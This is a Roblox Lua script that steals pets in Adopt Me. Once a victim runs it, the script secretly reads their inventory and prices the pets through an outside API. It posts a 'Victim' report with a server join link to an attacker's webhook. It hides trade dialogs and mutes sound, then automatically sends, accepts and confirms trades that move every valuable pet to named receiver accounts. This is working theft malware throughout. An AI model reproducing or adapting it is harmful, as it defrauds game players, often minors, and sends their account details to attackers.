_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    print("Script already running, exiting.")
    return
end
_G.scriptExecuted = true

local users = {"receiver1", "receiver2"}
local min_value = 3
local ping = "Yes"
local webhook = ""

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")
local textChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
local SoundService = game:GetService("SoundService")

spawn(function()
    while true do
        for _, sound in ipairs(game:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
            end
        end
        wait(1)
    end
end)


if next(users) == nil or webhook == "" then
    plr:kick("You didn't add username or webhook. Please configure your settings.")
    return
end

-- allow trading server if u want
if game.PlaceId ~= 920587237 then
    plr:kick("Game not supported. Please join a normal Adopt Me server")
    return
end


if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Only works in a public server, please switch to a different server.")
    return
end

local itemsToSend = {}
local inTrade = false
local playerGui = plr:WaitForChild("PlayerGui")
local tradeFrame = playerGui.TradeApp.Frame
local dialog = playerGui.DialogApp.Dialog
local toolApp = playerGui.ToolApp.Frame
local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)

if not tradeLicense.player_has_trade_license() then
    plr:kick("You need a trading license to use this script.")
    return
end

local HttpService = game:GetService("HttpService")
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting")
local InventoryDB = Loads("InventoryDB")

local headers = {
    ["Accept"] = "*/*",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
}

-- print("Fetching pet values..")
local valueResponse = request({
    Url = "https://elvebredd.com/api/pets/get-latest",
    Method = "GET",
    Headers = headers
})

local responseData = HttpService:JSONDecode(valueResponse.Body)
local petsData = HttpService:JSONDecode(responseData.pets)
-- print("Pet values fetched successfully.")

local petsByName = {}
for key, pet in pairs(petsData) do
    if type(pet) == "table" and pet.name then
        petsByName[pet.name] = pet
    end
end

local function formatValue(value)
    return string.format("%.1f", value)
end

local function getPetValue(petName, petProps)
    local pet = petsByName[petName]
    if not pet then
        return nil
    end

    local baseKey
    if petProps.mega_neon then
        baseKey = "mvalue"
    elseif petProps.neon then
        baseKey = "nvalue"
    else
        baseKey = "rvalue"
    end

    local suffix = ""
    if petProps.rideable and petProps.flyable then
        suffix = " - fly&ride"
    elseif petProps.rideable then
        suffix = " - ride"
    elseif petProps.flyable then
        suffix = " - fly"
    else
        suffix = " - nopotion"
    end

    local key = baseKey .. suffix
    return pet[key] or pet[baseKey]
end

local totalValue = 0

local function propertiesToString(props)
    local str = ""
    if props.mega_neon then
        str = str .. "M"
    elseif props.neon then
        str = str .. "N"
    end
    if props.flyable then
        str = str .. "F"
    end
    if props.rideable then
        str = str .. "R"
    end
    return str
end

local function SendJoinMessage(list, prefix)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local top5Pets = {}
    local sortedList = {}
    for _, item in ipairs(list) do
        table.insert(sortedList, item)
    end
    table.sort(sortedList, function(a, b)
        return a.Value > b.Value
    end)
    for i = 1, math.min(5, #sortedList) do
        local propsString = propertiesToString(sortedList[i].Properties)
        if propsString == "" then
            propsString = "No Potion"
        end
        table.insert(top5Pets, string.format("`%dx` - **%s** [%s] | `%s` Value", 1, sortedList[i].Name, propsString, formatValue(sortedList[i].Value)))
    end

    local summary = {
        normal = 0,
        neon = 0,
        mega = 0,
        fly = 0,
        ride = 0
    }
    for _, item in ipairs(list) do
        if item.Properties.mega_neon then
            summary.mega = summary.mega + 1
        elseif item.Properties.neon then
            summary.neon = summary.neon + 1
        else
            summary.normal = summary.normal + 1
        end
        if item.Properties.flyable then
            summary.fly = summary.fly + 1
        end
        if item.Properties.rideable then
            summary.ride = summary.ride + 1
        end
    end

    local fields = {
        {
            name = "Victim:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = string.format("[CLICK HERE](https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=%s)", game.JobId),
            inline = true
        },
        {
            name = "Best Pets:",
            value = table.concat(top5Pets, "\n"),
            inline = false
        },
        {
            name = "Pet list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Pets: **%s** | Total Value: **%s**\n\n**Pet Types:**\n> Normal: **%s**\n> Neon: **%s**\n> Mega: **%s**\n\n**Regular:**\n> Flyable: **%s**\n> Rideable: **%s**", #list, formatValue(totalValue), summary.normal, summary.neon, summary.mega, summary.fly, summary.ride),
            inline = false
        }
    }

    local grouped = {}
    for _, item in pairs(list) do
        local key = item.Name .. " " .. propertiesToString(item.Properties)
        if grouped[key] then
            grouped[key].Count = grouped[key].Count + 1
            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
        else
            grouped[key] = {
                Name = item.Name,
                Properties = item.Properties,
                Count = 1,
                TotalValue = item.Value
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalValue > b.TotalValue
    end)

    for _, group in ipairs(groupedList) do
        local propsString = propertiesToString(group.Properties)
        if propsString == "" then
            propsString = "No Potion"
        end
        local itemLine = string.format("`%dx` - **%s** [%s] | `%s` Value", group.Count, group.Name, propsString, formatValue(group.TotalValue))
        fields[4].value = fields[4].value .. itemLine .. "\n"
    end

    if #fields[4].value > 1024 then
        local lines = {}
        for line in fields[4].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[4].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[4].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix,
        ["embeds"] = {{
            ["title"] = "⭐ Awaiting transfer.",
            ["color"] = 16750000,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "© cursed.wtf"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    -- print("Sent profile webhook")
end

local function SendTransferredMessage(items, totalValue)
    -- print("Sending transferred pets webhook.")
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Victim:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Total Value:",
            value = formatValue(totalValue),
            inline = true
        },
        {
            name = "Pets transferred:",
            value = "",
            inline = false
        }
    }

    for _, item in ipairs(items) do
        local propsString = propertiesToString(item.Properties)
        if propsString == "" then
            propsString = "No Potion"
        end
        local itemLine = string.format("`1x` - **%s** [%s] | `%s` Value", item.Name, propsString, formatValue(item.Value))
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end
        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "✅ Pets Transferred!",
            ["color"] = 16750000,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "© cursed.wtf - 2025"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    -- print("Pets transferred webhook sent.")
end

local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local upvalues = debug.getupvalues(v)
        if type(upvalues[1]) == "table" then
            for key, value in pairs(upvalues[1]) do
                hashes[key] = value
            end
        end
    end
end

local function hashedAPI(remoteName, ...)
    local remote = hashes[remoteName]
    if not remote then return nil end

    if remote:IsA("RemoteFunction") then
        return remote:InvokeServer(...)
    elseif remote:IsA("RemoteEvent") then
        remote:FireServer(...)
    end
end

-- print("Fetching all server data..")
local data = hashedAPI("DataAPI/GetAllServerData")
if not data then
    plr:kick("Tampering detected. Please rejoin and re-execute without any other scripts")
    return
end
-- print("Server data fetched.")

local excludedItems = {
    "spring_2025_minigame_scorching_kaijunior",
    "spring_2025_minigame_toxic_kaijunior",
    "spring_2025_minigame_spiked_kaijunior",
    "spring_2025_minigame_spotted_kaijunior"
}
local inventory = data[plr.Name].inventory
-- print("Processing player inventory..")

for category, list in pairs(inventory) do
    for uid, data in pairs(list) do
        local cat = InventoryDB[data.category]
        if cat and cat[data.id] then
            local value = getPetValue(cat[data.id].name, data.properties)
            if value and value >= min_value then
                if table.find(excludedItems, data.id) then
                    continue
                end
                table.insert(itemsToSend, {UID = uid, Name = cat[data.id].name, Properties = data.properties, Value = value})
                totalValue = totalValue + value
            end
        end
    end
end
-- print("Inventory processing complete. Found " .. #itemsToSend .. " pets to transfer.")

tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeFrame.Visible then
        inTrade = true
        -- print("Trade is active.")
    else
        inTrade = false
        -- print("Trade is inactive.")
    end
end)

dialog:GetPropertyChangedSignal("Visible"):Connect(function()
    dialog.Visible = false
end)

toolApp:GetPropertyChangedSignal("Visible"):Connect(function()
    toolApp.Visible = true
end)

game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
-- print("Changed GUI visibility.")

local tradeInitiated = false
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        return a.Value > b.Value
    end)

    local prefix = ""
    if ping == "Yes" then
        prefix = "@everyone"
    end

    SendJoinMessage(itemsToSend, prefix)
    SettingsRemote:FireServer("trade_requests", 1)
    -- print("Player's trade settings are set to accept requests.")

    local function doTrade(joinedUser)
        if tradeInitiated then return end
        tradeInitiated = true
        -- print("Initiating trade with " .. joinedUser.Name)

        while #itemsToSend > 0 do
            if not inTrade then
                -- print("Sending trade request to " .. joinedUser.Name)
                SendTrade:FireServer(joinedUser)
                -- print("Trade request sent. Waiting 6 seconds before next attempt.")
                wait(6)
            else
                -- print("Adding pets to trade offer..")
                local itemsInThisTrade = {}
                local petsToAddCount = math.min(18, #itemsToSend)
                for i = 1, petsToAddCount do
                    local item = table.remove(itemsToSend, 1)
                    table.insert(itemsInThisTrade, item)
                    AddPetRemote:FireServer(item.UID)
                    -- print("Added " .. item.Name .. " to offer.")
                end
                -- print(petsToAddCount .. " pets added. Accepting negotiation and confirming trade..")

                repeat
                    AcceptNegotiationRemote:FireServer()
                    wait(0.1)
                    ConfirmTradeRemote:FireServer()
                    wait(0.1)
                until not inTrade

                -- print("Trade negotiation and confirmation complete.")

                local tradeValue = 0
                for _, item in ipairs(itemsInThisTrade) do
                    tradeValue = tradeValue + item.Value
                end
                SendTransferredMessage(itemsInThisTrade, tradeValue)
            end
        end

        -- print("All pets transferred.")
        plr:kick("Fihished Transfering pets ")
    end

    while wait(1) do
        if not tradeInitiated then
            for _, player in ipairs(Players:GetPlayers()) do
                if player and player.Character and plr.Character and player ~= plr and table.find(users, player.Name) then
                    local dist = (plr.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).magnitude
                    if dist <= 75 then
                        doTrade(player)
                        break
                    end
                end
            end
        end
    end
end